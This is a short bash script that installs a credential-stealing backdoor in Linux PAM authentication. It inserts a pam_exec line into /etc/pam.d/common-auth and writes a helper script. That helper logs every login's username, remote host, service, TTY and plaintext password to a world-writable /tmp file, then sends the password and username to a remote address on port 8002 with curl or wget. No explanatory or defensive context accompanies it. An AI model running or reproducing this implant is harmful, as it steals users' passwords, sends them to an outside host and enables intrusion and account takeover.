#!/bin/bash

FILE=/tmp/log.txt
touch $FILE
chmod 777 $FILE

echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/login.sh" | cat - /etc/pam.d/common-auth > /tmp/common-auth && mv /tmp/common-auth /etc/pam.d/common-auth

cat > /usr/local/bin/login.sh << EOF
#!/bin/sh
read password
echo "User: \$PAM_USER" >> $FILE
echo "Ruser: \$PAM_RUSER" >> $FILE
echo "Rhost: \$PAM_RHOST" >> $FILE
echo "Service: \$PAM_SERVICE" >> $FILE
echo "TTY: \$PAM_TTY" >> $FILE
echo "Password : \$password" >> $FILE
password=\$(python3 -c "import urllib.parse; print(urllib.parse.quote('''\$password'''))")
if command -v curl >/dev/null 2>&1; then
    curl -s -o /dev/null "http://10.123.123.123:8002/\$password?user=\$PAM_USER"
else
    wget -q -O /dev/null "http://10.123.123.123:8002/\$password?user=\$PAM_USER"
fi
EOF

chmod 700 /usr/local/bin/login.sh
chown root:root /usr/local/bin/login.sh